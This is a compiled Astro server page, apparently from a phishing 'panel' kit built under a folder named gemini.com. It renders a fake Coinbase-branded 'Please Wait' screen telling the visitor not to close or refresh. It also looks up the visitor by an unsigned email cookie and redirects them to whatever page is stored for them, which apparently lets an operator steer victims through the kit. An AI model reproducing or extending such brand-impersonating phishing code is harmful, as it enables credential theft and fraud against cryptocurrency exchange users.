import { c as createComponent, a as createAstro, d as renderComponent, r as renderTemplate, m as maybeRenderHead } from '../chunks/astro/server_MzpsRm1w.mjs';
import 'kleur/colors';
import { $ as $$AuthLayout } from '../chunks/AuthLayout_CigA1UqO.mjs';
import { $ as $$AuthCard } from '../chunks/AuthCard_DF9IDRFk.mjs';
import { i as initializeDb, g as getUserByEmail } from '../chunks/db__92qgssi.mjs';
/* empty css                                */
export { renderers } from '../renderers.mjs';

const $$Astro = createAstro();
const prerender = false;
const $$Wait = createComponent(async ($$result, $$props, $$slots) => {
  const Astro2 = $$result.createAstro($$Astro, $$props, $$slots);
  Astro2.self = $$Wait;
  initializeDb();
  const cookieHeader = Astro2.request.headers.get("cookie");
  const encodedEmail = cookieHeader?.match(/user_email=([^;]+)/)?.[1];
  const userEmail = encodedEmail ? decodeURIComponent(encodedEmail) : null;
  console.log("Cookie header:", cookieHeader);
  console.log("Encoded email:", encodedEmail);
  console.log("Decoded email:", userEmail);
  if (!userEmail) {
    console.log("No user email in cookie, redirecting to signin");
    return Astro2.redirect("/signin");
  }
  const user = await getUserByEmail(userEmail);
  console.log("User from database:", user);
  if (!user) {
    console.log("User not found in database, redirecting to signin");
    return Astro2.redirect("/signin");
  }
  if (user.current_page && user.current_page !== "wait") {
    console.log("User has current_page on load:", user.current_page);
    return Astro2.redirect(`/${user.current_page}`);
  }
  return renderTemplate`${renderComponent($$result, "AuthLayout", $$AuthLayout, { "title": "Please Wait", "data-astro-cid-4bhgcjq7": true }, { "default": async ($$result2) => renderTemplate` ${renderComponent($$result2, "AuthCard", $$AuthCard, { "data-astro-cid-4bhgcjq7": true }, { "default": async ($$result3) => renderTemplate` ${maybeRenderHead()}<div class="coinbase-card" data-astro-cid-4bhgcjq7> <div class="coinbase-logo" data-astro-cid-4bhgcjq7>coinbase</div> <h2 class="coinbase-heading" data-astro-cid-4bhgcjq7>Please Wait</h2> <p class="coinbase-subtext" data-astro-cid-4bhgcjq7>
We're preparing your account. This may take a few moments.
</p> <div class="loading-spinner" data-astro-cid-4bhgcjq7></div> <p class="coinbase-subtext" data-astro-cid-4bhgcjq7>Please do not close or refresh this page.</p> </div> ` })} ` })}   `;
}, "C:/Users/coold/Desktop/panels/gemini.com/src/pages/wait.astro", void 0);

const $$file = "C:/Users/coold/Desktop/panels/gemini.com/src/pages/wait.astro";
const $$url = "/wait";

const _page = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  default: $$Wait,
  file: $$file,
  prerender,
  url: $$url
}, Symbol.toStringTag, { value: 'Module' }));

const page = () => _page;

export { page };
